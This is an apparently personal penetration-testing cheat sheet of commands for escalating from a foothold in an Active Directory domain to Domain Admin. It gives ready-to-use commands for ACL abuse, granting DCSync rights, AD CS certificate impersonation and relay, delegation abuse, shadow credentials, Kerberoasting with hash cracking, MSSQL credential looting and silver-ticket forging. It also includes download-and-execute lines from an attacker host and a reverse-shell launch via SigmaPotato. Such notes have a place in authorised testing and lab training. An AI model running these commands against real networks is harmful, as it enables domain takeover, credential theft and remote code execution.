---
title: AD Privesc To DA
type: note
tab: Active Directory
inputs: [Username, Password, Hash, PFX, Shell]
outputs: [DA, DCSync, TGT, Hash]
tags: [ActiveDirectory, PrivilegeEscalation, Kerberos, SMB, LDAP]
---

# AD Privesc To DA

## WHY

Abuse BloodHound paths, AD CS, delegation, or misconfigurations to reach Domain Admin.

## WHEN

- BloodHound shows ACL abuse path.
- AD CS vulnerable template exists.
- You can create/modify computer accounts.
- You found high-value credentials.

## NEXT

- DA achieved: [[Post-DA]]

## Commands

### ACL Abuse - Add Group Member With PowerView

#Shell #ActiveDirectory #PrivilegeEscalation
Load PowerView, inspect privileged groups, add a user to the target group, and confirm membership.

```powershell
(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1') | IEX
Get-DomainGroup "<GROUP>"
Add-DomainGroupMember -Identity "<GROUP>" -Members <USER>
Get-DomainGroupMember "<GROUP>"
```

### ACL Abuse - Add Group Member With Net RPC

#Username #Password #SMB #ActiveDirectory #PrivilegeEscalation
GenericAll on group with net rpc.

```sh
net rpc group addmem '<GROUP>' '<USER>' -U '<DOMAIN>/<USER>%<PASS>' -S <DC_HOST>
```

### ACL Abuse - Grant DCSync With PowerView

#Shell #ActiveDirectory #PrivilegeEscalation
WriteDACL on domain: grant DCSync rights with PowerView.

```powershell
Add-DomainObjectAcl -TargetIdentity '<DOMAIN_DN>' -PrincipalIdentity '<USER>' -Rights DCSync
```

### ACL Abuse - Grant DCSync With Impacket

#Username #Password #ActiveDirectory #PrivilegeEscalation
WriteDACL on domain with Impacket.

```sh
impacket-dacledit -action write -rights DCSync -principal '<USER>' -target-dn '<DOMAIN_DN>' '<DOMAIN>/<USER>:<PASS>'
```

### ACL Abuse - ForceChangePassword

#Username #Password #ActiveDirectory #PrivilegeEscalation
ForceChangePassword.

```sh
net rpc password '<TARGET_USER>' '<NEW_PASS>' -U '<DOMAIN>/<USER>%<PASS>' -S <DC_HOST>
```

### AD CS ESC1 Certificate Impersonation

#Username #Password #ActiveDirectory #PrivilegeEscalation
Request a certificate as an admin UPN, then authenticate with the issued PFX.

1. Request a certificate impersonating the target admin.

```sh
certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn '<ADMIN>@<DOMAIN>' -dc-ip <DC_IP>
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn '<TARGET_USER>@<DOMAIN>' -dc-ip <DC_IP> -target <DC_HOST>
```

2. Authenticate with the PFX to get a TGT/hash.

```sh
certipy auth -pfx <ADMIN>.pfx -dc-ip <DC_IP>
certipy-ad auth -pfx <PFX_FILE> -dc-ip <DC_IP>
```

### AD CS ESC8 NTLM Relay

#NTLM #HTTP #ActiveDirectory #PrivilegeEscalation
ESC8: relay NTLM to AD CS.

```sh
certipy relay -target http://<CA_HOST>/certsrv/ -template <TEMPLATE>
```

### Constrained Delegation

#Username #Hash #Kerberos #ActiveDirectory #PrivilegeEscalation
Constrained delegation: impersonate DA to CIFS.

```sh
impacket-getST -spn cifs/<TARGET_HOST> -impersonate <DA_USER> <DOMAIN>/<USER> -hashes :<NTLM_HASH>
```

### RBCD

#Username #Password #ActiveDirectory #PrivilegeEscalation
Create a fake computer, grant it delegation to the target, then request a service ticket.

1. Add a fake computer account.

```sh
impacket-addcomputer <DOMAIN>/<USER>:<PASS> -computer-name '<FAKE_COMPUTER>$' -computer-pass '<FAKE_PASS>' -dc-ip <DC_IP>
```

2. Set resource-based constrained delegation to the target computer.

```sh
impacket-rbcd -delegate-from '<FAKE_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -dc-ip <DC_IP> -action write <DOMAIN>/<USER>:<PASS>
```

3. Request a CIFS ticket while impersonating the target admin.

```sh
impacket-getST -spn cifs/<TARGET_HOST> -impersonate <DA_USER> <DOMAIN>/<FAKE_COMPUTER>$:<FAKE_PASS> -dc-ip <DC_IP>
```

### RBCD With NTLM Hash

#Username #Hash #Kerberos #ActiveDirectory #PrivilegeEscalation
Use GenericAll/GenericWrite on a computer object to add a fake computer, configure RBCD, request a CIFS ticket, and execute with Kerberos.

1. Collect BloodHound context with a hash.

```sh
nxc ldap <DC_IP> -u <USER> -H <NTLM_HASH> -d <DOMAIN> --dns-server <DC_IP> --bloodhound --collection All
```

2. Add a fake computer account with hash auth.

```sh
impacket-addcomputer <DOMAIN>/<USER> -dc-ip <DC_IP> -hashes :<NTLM_HASH> -computer-name '<FAKE_COMPUTER>$' -computer-pass '<FAKE_PASS>'
```

3. Grant RBCD from the fake computer to the target computer.

```sh
wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
python3 rbcd.py -dc-ip <DC_IP> -t <TARGET_COMPUTER> -f <FAKE_COMPUTER> -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'
```

4. Request and use a CIFS ticket as the target admin.

```sh
impacket-getST -spn cifs/<TARGET_FQDN> <DOMAIN>/<FAKE_COMPUTER>$:'<FAKE_PASS>' -impersonate <ADMIN_USER> -dc-ip <DC_IP>
export KRB5CCNAME=$PWD/<TICKET>.ccache
sudo sh -c 'echo "<DC_IP> <TARGET_FQDN>" >> /etc/hosts'
sudo impacket-psexec -k -no-pass <TARGET_FQDN> -dc-ip <DC_IP>
whoami
```

### Shadow Credentials

#Username #Password #ActiveDirectory #PrivilegeEscalation
Add shadow credentials to a target account, then authenticate with the generated PFX.

1. Add a shadow credential to the target account.

```sh
certipy shadow add -u '<USER>@<DOMAIN>' -p '<PASS>' -account '<TARGET_USER>' -dc-ip <DC_IP>
```

2. Authenticate using the shadow credential PFX.

```sh
certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>
```

### Targeted Kerberoast To ForceChangePassword

#Username #Password #Kerberos #ActiveDirectory #PrivilegeEscalation
When BloodHound shows a path through `GenericAll` or `ForceChangePassword`, roast the next user, crack the TGS, reset the next credential, then validate RDP/SMB.

```sh
# Roast the target user added by the ACL path.
targetedKerberoast.py -v -d <DOMAIN> -u <USER> -p '<PASS>' --dc-ip <DC_IP>

# Crack the captured TGS.
echo '<TGS_HASH>' > targeted.hash
hashcat -m 13100 targeted.hash <WORDLIST>

# Reset the next user password through RPC.
rpcclient -N <DC_HOST> -U '<TARGET_USER>%<TARGET_PASS>'
setuserinfo2 <NEXT_USER> 23 '<NEW_PASS>'

# Alternative reset with net rpc.
net rpc password '<NEXT_USER>' '<NEW_PASS>' -U '<DOMAIN>/<TARGET_USER>%<TARGET_PASS>' -S <DC_HOST>

# Verify and use the new credential.
nxc smb <DC_HOST> -u <NEXT_USER> -p '<NEW_PASS>'
xfreerdp3 /u:<NEXT_USER> /p:'<NEW_PASS>' /v:<DC_HOST> /dynamic-resolution /cert:ignore +clipboard
```

### MSSQL Login Impersonation Credential Loot

#Username #Password #MSSQL #ActiveDirectory #Looting #PrivilegeEscalation
Use a low-privileged MSSQL login, check impersonation rights, switch context, and loot application credentials from accessible databases.

```sql
-- Connect with Windows auth first:
-- impacket-mssqlclient '<DOMAIN>/<USER>':'<PASS>'@<DC_IP> -dc-ip <DC_IP> -windows-auth

-- List SQL logins and databases.
SELECT name FROM master..syslogins;
SELECT name FROM master..sysdatabases;

-- Check whether any login can be impersonated.
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate the readable login and inspect the app database.
EXECUTE AS LOGIN = '<IMPERSONATABLE_LOGIN>';
USE <DB_NAME>;
SELECT * FROM <DB_NAME>.INFORMATION_SCHEMA.TABLES;
SELECT * FROM <CREDENTIAL_TABLE>;
```

### MSSQL Local-Only Silver Ticket Chain

#Username #Password #Kerberos #MSSQL #Windows #ActiveDirectory #PrivilegeEscalation #Pivoting
When MSSQL is reachable only locally and the SQL service account credential is known, tunnel local SQL, forge a MSSQL Silver Ticket, enable `xp_cmdshell`, and abuse `SeImpersonatePrivilege`.

1. On the Windows target, confirm SQL listens locally and collect domain/SPN details.

```powershell
netstat -ano | Select-String "1433"
Get-ADDomain
Get-ADUser -Filter {SamAccountName -eq "<SQL_SERVICE_USER>"} -Properties UserPrincipalName
Get-ADUser -Filter {SamAccountName -eq "<SQL_SERVICE_USER>"} -Properties ServicePrincipalNames
```

2. Start reverse Chisel and forward target-local MSSQL back to the attacker box.

```sh
# Attacker.
chisel server --socks5 --reverse -p <CHISEL_PORT>
```

```powershell
# Target.
upload chisel.exe
.\chisel.exe client <LHOST>:<CHISEL_PORT> R:1433:127.0.0.1:1433
```

3. Configure local resolution/proxy and verify MSSQL.

```sh
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf
sudo sh -c 'echo "127.0.0.1 <MSSQL_HOST_FQDN>" >> /etc/hosts'
nmap -p1433 127.0.0.1
impacket-mssqlclient <SQL_SERVICE_USER>:<SQL_SERVICE_PASS>@127.0.0.1 -windows-auth
```

4. Forge and export the MSSQL Silver Ticket.

```sh
echo -n '<SQL_SERVICE_PASS>' | iconv -t UTF-16LE | openssl md4
impacket-ticketer -nthash <SQL_SERVICE_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn MSSQL/<MSSQL_HOST_FQDN> -user-id 500 Administrator
export KRB5CCNAME=$PWD/Administrator.ccache
```

5. Use the ticket, enable command execution, upload SigmaPotato, and trigger SYSTEM execution.

```sh
impacket-mssqlclient -k <MSSQL_HOST_FQDN>
```

```sql
enable_xp_cmdshell
xp_cmdshell "whoami /priv"
xp_cmdshell "certutil.exe -urlcache -split -f http://<LHOST>/SigmaPotato.exe C:\Temp\SigmaPotato.exe"
xp_cmdshell "C:\Temp\SigmaPotato.exe whoami"
xp_cmdshell "C:\Temp\SigmaPotato.exe --revshell <LHOST> <LPORT>"
```

## Priority Order

1. BloodHound obvious edges: GenericAll, WriteDACL, ForceChangePassword, AddMember.
2. AD CS: ESC1/ESC8.
3. Delegation: constrained delegation or RBCD.
4. Shadow Credentials.
5. GPP/SYSVOL passwords.
